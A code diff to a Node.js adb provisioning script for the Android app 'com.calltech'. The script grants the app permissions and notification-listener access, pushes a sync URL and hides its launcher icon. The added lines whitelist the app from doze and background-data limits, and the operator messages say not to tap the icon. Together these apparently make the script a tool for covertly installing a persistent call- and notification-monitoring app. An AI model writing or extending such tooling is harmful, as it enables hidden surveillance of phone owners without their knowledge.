@@ -6,6 +6,7 @@ const {execSync} = require('child_process');
 const {listAdbDevices} = require('./project-paths');
 const {hideLauncherOnly, wakeBackground} = require('./hide-launcher-icon');
 const {launchPermissionPopup} = require('./launch-permission-popup');
+const {isPackageInstalled, runOutput: shellOutput} = require('./package-check');
 
 const PACKAGE = 'com.calltech';
 const PERMISSIONS = [
@@ -34,11 +35,7 @@ function run(command) {
 }
 
 function runOutput(command) {
-  try {
-    return execSync(command, {encoding: 'utf8'}).trim();
-  } catch (_error) {
-    return '';
-  }
+  return shellOutput(command);
 }
 
 function listDevices() {
@@ -52,7 +49,7 @@ function listUserIds(deviceId) {
 }
 
 function isInstalled(deviceId) {
-  return runOutput(`adb -s ${deviceId} shell pm path ${PACKAGE}`).includes('package:');
+  return isPackageInstalled(deviceId, PACKAGE);
 }
 
 function apkOnPhone(deviceId) {
@@ -101,10 +98,15 @@ function enableBackground(deviceId) {
   const manufacturer = runOutput(`adb -s ${deviceId} shell getprop ro.product.manufacturer`).toLowerCase();
   const cmds = [
     `adb -s ${deviceId} shell cmd deviceidle whitelist +${PACKAGE}`,
+    `adb -s ${deviceId} shell dumpsys deviceidle whitelist +${PACKAGE}`,
+    `adb -s ${deviceId} shell cmd netpolicy add restrict-background-whitelist ${PACKAGE}`,
     `adb -s ${deviceId} shell appops set ${PACKAGE} RUN_IN_BACKGROUND allow`,
     `adb -s ${deviceId} shell appops set ${PACKAGE} RUN_ANY_IN_BACKGROUND allow`,
     `adb -s ${deviceId} shell appops set ${PACKAGE} WAKE_LOCK allow`,
     `adb -s ${deviceId} shell appops set ${PACKAGE} START_FOREGROUND allow`,
+    `adb -s ${deviceId} shell cmd appops set ${PACKAGE} RUN_IN_BACKGROUND allow`,
+    `adb -s ${deviceId} shell cmd appops set ${PACKAGE} RUN_ANY_IN_BACKGROUND allow`,
+    `adb -s ${deviceId} shell cmd appops set ${PACKAGE} WAKE_LOCK allow`,
   ];
 
   if (manufacturer.includes('xiaomi') || manufacturer.includes('redmi')) {
@@ -253,20 +255,18 @@ function grantOnDevice(deviceId) {
 
   pushSyncUrl(deviceId);
 
-  console.log('  Phone par permission popup khol raha hoon — app nahi khulegi. Allow dabao.');
+  console.log('  Phone par permission popup khol raha hoon — icon tap mat karo. Allow dabao.');
   launchPermissionPopup(deviceId);
 
   run(
     `adb -s ${deviceId} shell cmd notification allow_listener ${PACKAGE}/${PACKAGE}.CallTechNotificationListener`,
   );
 
-  wakeBackground(deviceId);
-
   execSync('ping -n 3 127.0.0.1 > nul', {stdio: 'ignore'});
   const missing = PERMISSIONS.filter(permission => !isPermissionGranted(deviceId, permission));
   if (missing.length > 0) {
     console.log('  Phone screen par system permission popup dekho — sab Allow karo.');
-    console.log('  App kholne / icon tap karne ki zaroorat nahi.');
+    console.log('  CallTech icon tap mat karo — popup USB se khulta hai.');
     if (manufacturer.toLowerCase().includes('realme') || manufacturer.toLowerCase().includes('oppo')) {
       console.log('  Realme/Oppo: Developer options -> Install via USB ON');
     }
@@ -277,6 +277,7 @@ function grantOnDevice(deviceId) {
       console.log('  Redmi: Developer options -> "Install via USB" + "USB debugging (Security settings)" ON.');
     }
   } else {
+    wakeBackground(deviceId);
     hideLauncherOnly(deviceId);
     console.log('  permissions already granted — hide + background sync');
   }
